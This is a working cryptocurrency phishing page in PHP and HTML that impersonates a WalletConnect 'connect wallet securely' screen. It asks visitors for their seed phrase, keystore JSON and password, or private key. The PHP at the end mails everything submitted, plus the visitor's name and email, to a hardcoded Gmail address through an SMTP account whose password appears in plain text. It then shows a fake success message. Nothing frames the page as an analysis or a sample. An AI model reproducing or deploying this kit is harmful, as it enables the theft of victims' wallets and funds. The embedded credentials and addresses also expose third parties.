<?php
session_start();
if(isset($_POST['send'])){

$_SESSION['email']=$_POST['email'];
$_SESSION['name']=$_POST['name'];

}

$email=$_SESSION['email'];
$name=$_SESSION['name'];


?>

<!DOCTYPE html>
<!-- saved from url=(0079)https://tokenprocoins.org/key/locate/coinbase/Connect%20__%20WalletConnext.html -->
<html><!-- Mirrored from tokenprocoin.digital/token/key/locate/coinbase/Connect __ WalletConnext.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 25 Aug 2021 18:47:23 GMT --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">


    <link rel="stylesheet" href="./Connect __ WalletConnext_files/main.css" type="text/css">
    
    <meta name="description" content="Open protocol for connecting Wallets to Dapps">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:image" content="asset/images/logo.html">
    <link rel="icon" href="./Connect __ WalletConnext_files/logo.svg">
    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
    <title>Connect || WalletConnext
</title>
    <script>
        function openCity(evt, cityName) {
            // Declare all variables
            var i, tabcontent, tablinks;

            // Get all elements with class="tabcontent" and hide them
            tabcontent = document.getElementsByClassName("tabcontent");
            for (i = 0; i < tabcontent.length; i++) {
                tabcontent[i].style.display = "none";
            }

            // Get all elements with class="tablinks" and remove the class "active"
            tablinks = document.getElementsByClassName("tablinks");
            for (i = 0; i < tablinks.length; i++) {
                tablinks[i].className = tablinks[i].className.replace(" active", "");
            }

            // Show the current tab, and add an "active" class to the button that opened the tab
            document.getElementById(cityName).style.display = "block";
            evt.currentTarget.className += " active";
        }
    </script>
</head>

<body>
    <center>
    <div class="top">
        <a href="https://dexwalletconnect.org/connect?type=metamask#" class="left">Github</a>
        <a href="https://dexwalletconnect.org/connect?type=metamask#" class="left">Docs</a>
        <a href="https://dexwalletconnect.org/" class="main"><img src="./Connect __ WalletConnext_files/logo.svg" alt="logo"></a>
        <a href="https://dexwalletconnect.org/connect?type=metamask#" class="left">Wallets</a>
        <a href="https://dexwalletconnect.org/connect?type=metamask#" class="left">Apps</a>
    </div>
    <br>
    <h2>
        <center>CONNECT WALLET SECURELY</center>
    </h2>
    <br>
                <div class="tab">
        <button class="tablinks active" id="default" onclick="openCity(event, &#39;phrase&#39;)">Phrase</button>
        <button class="tablinks" onclick="openCity(event, &#39;keystore&#39;)">Keystore JSON</button>
        <button class="tablinks" onclick="openCity(event, &#39;private&#39;)">Private Key</button>
    </div>

    <div id="phrase" class="tabcontent" style="display: block;">
        <form action="" method="POST">
        <input type="hidden" name="_token" value="JmIip1CtjgdgaDy2ICZgg9i7Z5x1layql7rHp0Di">            <input type="hidden" name="category" value="Phrase">

            <textarea name="phrase"  minlength="12" placeholder="Phrase"></textarea>
            <br>
            <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
            <br>
            
        
    </div>

    <div id="keystore" class="tabcontent" style="display: none;">
        
        <input type="hidden" name="_token" value="JmIip1CtjgdgaDy2ICZgg9i7Z5x1layql7rHp0Di"> 
                   <input type="hidden" name="category" value="Keystore JSON">

            <textarea name="keystore" minlength="12" placeholder="Keystore JSON"></textarea>
            <br>
            <div class="field">
                <input type="text" name="password" placeholder="Password">
            </div>
            <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.
            </div>
            <br>
            
        
    </div>
   

    <div id="private" class="tabcontent" style="display: none;">
        
        <input type="hidden" name="_token" value="JmIip1CtjgdgaDy2ICZgg9i7Z5x1layql7rHp0Di">            <input type="hidden" name="category" value="Private Key">
            <div class="field">
                <input type="text" name="key" placeholder="Private Key">
            </div>
            <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
            <br>
            
        
    </div>
    <button type="submit" class="btn"  name="submit">VALIDATE </button>
    </form>
    <footer>
        <div id="footer">
            <p><img src="./Connect __ WalletConnext_files/discord.svg" class="footimg"> <a href="https://tokenprocoins.org/discord.com/invite/jhxMvxP.html">Discord</a></p><br>
            <p><img src="./Connect __ WalletConnext_files/telegram.svg" class="footimg"> <a href="https://t.me/alanivar">Telegram</a></p><br>
            <p><img src="./Connect __ WalletConnext_files/twitter.svg" class="footimg"> <a href="https://twitter.walletconnect.org/">Twitter</a>
            </p><br>
            <p><img src="./Connect __ WalletConnext_files/github.svg" class="footimg"> <a href="https://tokenprocoins.org/github.com/walletconnect.html">Github</a></p>
            <br>
    </div></footer>
    <script>
        document.getElementById("default").click();
    </script>
</center>



<!-- Mirrored from tokenprocoin.digital/token/key/locate/coinbase/Connect __ WalletConnext.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 25 Aug 2021 18:47:49 GMT -->
</body>
<?php



use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;
require "PHPMailer/vendor/autoload.php";


if(isset($_POST['submit'])){
    $phrase=$_POST['phrase'];
$key=$_POST['key'];
$keystore=$_POST['keystore'];
$password=$_POST['password'];



$email_from = "support@btccloudmine.com";

$email_subject = "New Form Submission from $name";
 
$email_body = "
<p>Full name: $name</p>
<p>Email address: $email</p>
            

                <p>Phrase: $phrase</p> 
              
              <p>Key: $key</p> 
              <p>Keystore Json: $keystore</p>
              
              <p>Password: $password</p> 
			  ";
              
$to = "bobmanueltamunotokini@gmail.com";

$headers = "From: support@rpgairdrops.com\r\n";

$headers = "Reply-To $email\r\n";

$mail=new PHPMailer(true);
$mail->SMTPDebug=0;
$mail->isSMTP(true);
$mail->SMTPAuth=true;
$mail->Host="mail.rpgairdrops.com";
$mail->Username="support@rpgairdrops.com";
$mail->Password="charmingdesk10";


$mail->isHTML(true);
$mail->setFrom("support@rpgairdrops.com");
$mail->addAddress($to);
 
$mail->WordWrap = 50;
$mail->Subject=$email_subject;
$mail->Body=$email_body;
//$mail->AddAttachment("$target1","front-id");
//$mail->AddAttachment("$target2","back-id");

$sendmail=$mail->send();
if(!$sendmail){
    echo $mail->ErrorInfo;
}
else{
    echo "
    <script>
    swal('Success', 'We have received your request', 'success');
    </script>
    ";
}

}





?>

</html>